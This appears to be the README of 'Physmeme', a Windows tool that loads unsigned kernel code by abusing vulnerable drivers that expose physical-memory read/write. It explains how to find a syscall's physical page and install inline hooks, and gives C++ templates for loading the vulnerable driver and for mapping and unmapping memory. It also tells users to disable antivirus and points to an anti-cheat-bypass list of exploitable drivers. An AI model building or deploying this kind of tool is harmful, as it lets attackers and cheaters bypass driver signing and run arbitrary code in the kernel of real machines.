# Credits

Before I begin, those who helped me create this project shall be credited.

- [Can1357](https://blog.can.ac), for helping me find the correct page in physical memory.
- buck, for teaching me everything about paging tables. (although not used in this project)
- Ch40zz, for helping me fix many issues in things I could never have fixed.
- wlan, I used your drv_image class :)

# Physmeme

Given ANY map/unmap (read/write) of physical memory, one can now systematically map unsigned code into ones kernel.
Many drivers expose this primitive and now can all be exploited by simply coding a few functions. 

# WARNING

All anti virus softwares must be disabled/uninstalled avast specically... they hook the system service dispatch table with their HV and prevent physmeme from working...

### What versions of windows does this mapper support?

This mapper should work without any issues for pretty much all versions of relevant windows. Tested on windows 10 (1803-1909), but should support all the way back to vista.

<img src="https://cdn.discordapp.com/attachments/693313068247285821/701219951733768232/unknown.png"/>

### What drivers support physical read/write?

Any driver exposing MmMapIoSpace/MmUnmapIoSpace or ZwMapViewOfSection/ZwUnmapViewOfSection can be exploited. This means bios flashing utils, fan speed utils
(like MSI Afterburner), or general windows system utilities that expose physical read/write. 

If you are in any sort of doubt about the abundance of these drivers simply go to 
<a href="https://www.unknowncheats.me/forum/anti-cheat-bypass/334557-vulnerable-driver-megathread.html">this</a> page and ctrl-f "MmMapIoSpace". (24 results)

### How does this exploit work?

Since we are able to read/write to any physical memory on the system the goal is to find the physical page of a syscall. This can be done by calculating the offset into the page in which the syscall resides. Doing so is trivial and only requires the modulo operation.

```cpp
auto syscall_page_offet = rva % 0x1000;
```

Now that we know that the syscalls bytes are going to be that far into the physical page we can map each physical page into our process 512 at a time (2mb) and then
check the page + page_offset and compare with the syscalls bytes. After we have the syscalls page we can install inline hooks and then call into the function.

<img src="https://cdn.discordapp.com/attachments/687446832175251502/701355063939039292/unknown.png"/>

### How long does it take to find the physical page?

Less then one second. For each physical memory range I create a thread that maps 2mb at a time of physical memory and scans each physical page. This is on a system with 16gb.

In other words... its very fast, you wont need to worry about waiting to find the correct page.

# How to use

There are four functions that need to be altered to make this mapper work for you. I will cover each one by one. These functions are defined inside of a `physmeme.hpp` and need
to stay inside of this file. This allows people to make different `physmeme.hpp` files for each driver they want to abuse. Modular code. 

When writing your driver you will need a custom entry point just like every other driver mapper.

### `HANDLE load_drv()`
Load driver must take zero parameters and return a handle to the driver. Here is an example of this:

```cpp
/*
	please code this function depending on your method of physical read/write.
*/
HANDLE load_drv()
{
	static const auto load_driver_ptr = 
		reinterpret_cast<__int64(*)()>(
			GetProcAddress(LoadLibrary("pmdll64.dll"), "LoadPhyMemDriver"));

	if (load_driver_ptr)
		load_driver_ptr();

	//--- i dont ever use this handle, its just an example of what you should do.
	return CreateFileA("\\\\.\\PhyMem", 0xC0000000, 3u, 0i64, 3u, 0x80u, 0i64);
}
```

note: my exploited driver actually came with a dll that exported all the functions.

### `bool unload_drv()`
Unload driver can and should return a bool but its not needed. There is also no need to pass any parameters since the driver handle is global.

```cpp
/*
	please code this function depending on your method of physical read/write.
*/
bool unload_drv()
{
	static const auto unload_driver_ptr = 
		reinterpret_cast<__int64(*)()>(
			GetProcAddress(LoadLibrary("pmdll64.dll"), "UnloadPhyMemDriver"));
	return unload_driver_ptr ? unload_driver_ptr() : false;
}
```

### `std::uintptr_t map_phys(std::uintptr_t addr, std::size_t size)`

This function MUST take two parameters the first is the physical address to be mapped, the second is the size to be mapped. The return
value is the virtual address of the mapping.

```cpp
/*
	please code this function depending on your method of physical read/write.
*/
std::uintptr_t map_phys(
	std::uintptr_t addr,
	std::size_t size
)
{
	//--- ensure the validity of the address we are going to try and map
	if (!is_valid(addr))
		return NULL;

	static const auto map_phys_ptr = 
		reinterpret_cast<__int64(__fastcall*)(__int64, unsigned)>(
			GetProcAddress(LoadLibrary("pmdll64.dll"), "MapPhyMem"));
	return map_phys_ptr ? map_phys_ptr(addr, size) : false;
}
```

### `bool unmap_phys(std::uintptr_t addr, std::size_t size)`

This function must take the virtual address of the mapping (the address returned from map_phys) and the size that was mapped. If this function is unable to free the memory
you will blue screen because you will run out of ram (happend a few times to me).

```cpp
/*
	please code this function depending on your method of physical read/write.
*/
bool unmap_phys(
	std::uintptr_t addr,
	std::size_t size
) 
{
	static const auto unmap_phys_ptr = 
		reinterpret_cast<__int64(*)(__int64, unsigned)>(
			GetProcAddress(LoadLibrary("pmdll64.dll"), "UnmapPhyMem"));
	return unmap_phys_ptr ? unmap_phys_ptr(addr, size) : false;
}
```

# DriverEntry

you can change the paremeters you pass to driver entry simply by changing this:

```cpp
using DRIVER_INITIALIZE = NTSTATUS(__stdcall*)(std::uintptr_t, std::size_t);
```

right now your entry point should look like this:

```cpp
NTSTATUS DriverEntry(PVOID lpBaseAddress, DWORD32 dwSize)
```

The source the hello-world.sys is the following:

```cpp
#include <ntifs.h>

NTSTATUS DriverEntry(PVOID lpBaseAddress, DWORD32 dwSize)
{
	DbgPrint("> Base Address: 0x%p, Size: 0x%x", lpBaseAddress, dwSize);
	return STATUS_SUCCESS;
}

```